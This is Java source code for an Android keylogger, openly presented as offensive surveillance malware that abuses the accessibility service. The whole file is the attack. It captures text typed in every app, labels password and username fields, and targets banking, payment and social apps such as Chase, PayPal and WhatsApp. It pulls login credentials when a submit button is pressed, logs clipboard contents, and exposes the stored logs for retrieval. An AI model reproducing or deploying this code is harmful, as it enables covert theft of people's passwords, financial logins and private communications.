package com.offensive.blackstealth.surveillance;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;

/**
 * Accessibility Service-based Keylogger
 * Captures all text input across applications
 */
public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";
    
    private StringBuilder currentInput;
    private String currentPackage;
    private String currentApp;
    private File logFile;
    private ExecutorService executor;
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private KeylogCallback callback;
    private boolean isLogging = true;
    private Set<String> sensitiveApps;
    private SimpleDateFormat dateFormat;
    
    public interface KeylogCallback {
        void onKeystroke(String app, String text);
        void onClipboard(String content);
        void onCredentialDetected(String app, String username, String password);
    }
    
    public static KeyloggerService instance;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        currentInput = new StringBuilder();
        executor = Executors.newSingleThreadExecutor();
        dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        
        // Initialize log file
        File dir = new File(getFilesDir(), "logs");
        dir.mkdirs();
        logFile = new File(dir, "keylog_" + System.currentTimeMillis() + ".txt");
        
        // Sensitive apps to watch for credentials
        sensitiveApps = new HashSet<>(Arrays.asList(
            "com.facebook.katana", "com.instagram.android", "com.twitter.android",
            "com.whatsapp", "com.google.android.gm", "com.paypal.android.p2pmobile",
            "com.venmo", "com.chase.sig.android", "com.wf.wellsfargomobile"
        ));
        
        // Setup clipboard monitoring
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(this::onClipboardChanged);
        
        Log.i(TAG, "Keylogger service started");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isLogging) return;
        
        try {
            String packageName = event.getPackageName() != null ? 
                event.getPackageName().toString() : "";
            
            // Track app changes
            if (!packageName.equals(currentPackage)) {
                flushBuffer();
                currentPackage = packageName;
                currentApp = getAppName(packageName);
                logEntry("\n[" + dateFormat.format(new Date()) + "] App: " + currentApp);
            }
            
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleFocusChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleClick(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing event: " + e.getMessage());
        }
    }
    
    private void handleTextChanged(AccessibilityEvent event) {
        CharSequence text = event.getText() != null && !event.getText().isEmpty() ?
            event.getText().get(0) : null;
        
        if (text != null) {
            String input = text.toString();
            
            // Detect password fields
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                boolean isPassword = source.isPassword();
                String fieldHint = source.getHintText() != null ? 
                    source.getHintText().toString().toLowerCase() : "";
                String fieldId = source.getViewIdResourceName() != null ?
                    source.getViewIdResourceName().toLowerCase() : "";
                
                if (isPassword || fieldHint.contains("password") || 
                    fieldId.contains("password")) {
                    input = "[PASSWORD]: " + input;
                } else if (fieldHint.contains("email") || fieldHint.contains("username") ||
                           fieldId.contains("email") || fieldId.contains("username")) {
                    input = "[USER/EMAIL]: " + input;
                }
                
                source.recycle();
            }
            
            currentInput.append(input);
            
            // Notify callback
            if (callback != null) {
                callback.onKeystroke(currentApp, input);
            }
        }
    }
    
    private void handleFocusChanged(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source != null) {
            String className = source.getClassName() != null ? 
                source.getClassName().toString() : "";
            
            if (className.contains("EditText")) {
                flushBuffer();
                
                String hint = "";
                if (source.getHintText() != null) {
                    hint = " [Hint: " + source.getHintText() + "]";
                }
                logEntry("\n  > Input field focused" + hint);
            }
            source.recycle();
        }
    }
    
    private void handleWindowChanged(AccessibilityEvent event) {
        CharSequence className = event.getClassName();
        if (className != null && className.toString().contains("Dialog")) {
            logEntry("\n  [Dialog opened]");
        }
    }
    
    private void handleClick(AccessibilityEvent event) {
        CharSequence text = event.getText() != null && !event.getText().isEmpty() ?
            event.getText().get(0) : null;
        
        if (text != null) {
            String buttonText = text.toString().toLowerCase();
            
            // Detect login/submit buttons
            if (buttonText.contains("login") || buttonText.contains("sign in") ||
                buttonText.contains("submit") || buttonText.contains("continue")) {
                flushBuffer();
                logEntry("\n  [SUBMIT CLICKED: " + text + "]");
                
                // Check for credential capture
                if (sensitiveApps.contains(currentPackage)) {
                    extractCredentials();
                }
            }
        }
    }
    
    private void extractCredentials() {
        // Try to find username/password from current screen
        executor.submit(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                
                String username = null;
                String password = null;
                
                List<AccessibilityNodeInfo> nodes = new ArrayList<>();
                findEditTexts(root, nodes);
                
                for (AccessibilityNodeInfo node : nodes) {
                    String text = node.getText() != null ? node.getText().toString() : "";
                    String hint = node.getHintText() != null ? 
                        node.getHintText().toString().toLowerCase() : "";
                    String id = node.getViewIdResourceName() != null ?
                        node.getViewIdResourceName().toLowerCase() : "";
                    
                    if (node.isPassword()) {
                        password = text;
                    } else if (hint.contains("email") || hint.contains("username") ||
                               id.contains("email") || id.contains("username")) {
                        username = text;
                    }
                }
                
                if (username != null && password != null && callback != null) {
                    callback.onCredentialDetected(currentApp, username, password);
                    logEntry("\n  [CREDENTIALS CAPTURED] User: " + username + 
                            " Pass: " + password);
                }
                
                root.recycle();
            } catch (Exception e) {
                Log.e(TAG, "Credential extraction failed: " + e.getMessage());
            }
        });
    }
    
    private void findEditTexts(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> result) {
        if (node == null) return;
        
        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        if (className.contains("EditText")) {
            result.add(node);
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            findEditTexts(node.getChild(i), result);
        }
    }
    
    private void onClipboardChanged() {
        try {
            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                String content = clip.getItemAt(0).getText() != null ?
                    clip.getItemAt(0).getText().toString() : "";
                
                if (!content.equals(lastClipboard) && !content.isEmpty()) {
                    lastClipboard = content;
                    logEntry("\n  [CLIPBOARD]: " + content);
                    
                    if (callback != null) {
                        callback.onClipboard(content);
                    }
                }
            }
        } catch (Exception e) {}
    }
    
    private void flushBuffer() {
        if (currentInput.length() > 0) {
            logEntry("\n  Input: " + currentInput.toString());
            currentInput.setLength(0);
        }
    }
    
    private void logEntry(String entry) {
        executor.submit(() -> {
            try (FileWriter fw = new FileWriter(logFile, true)) {
                fw.write(entry);
            } catch (Exception e) {}
        });
    }
    
    private String getAppName(String packageName) {
        try {
            return getPackageManager().getApplicationLabel(
                getPackageManager().getApplicationInfo(packageName, 0)).toString();
        } catch (Exception e) {
            return packageName;
        }
    }
    
    public void setCallback(KeylogCallback callback) {
        this.callback = callback;
    }
    
    public void setLogging(boolean enabled) {
        this.isLogging = enabled;
    }
    
    public byte[] getLogData() {
        try {
            return readFile(logFile);
        } catch (Exception e) {
            return new byte[0];
        }
    }
    
    private byte[] readFile(File file) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[4096];
        int read;
        while ((read = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, read);
        }
        fis.close();
        return baos.toByteArray();
    }
    
    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        
        Log.i(TAG, "Accessibility service connected");
    }
    
    @Override
    public void onInterrupt() {
        flushBuffer();
    }
    
    @Override
    public void onDestroy() {
        flushBuffer();
        executor.shutdown();
        super.onDestroy();
    }
}
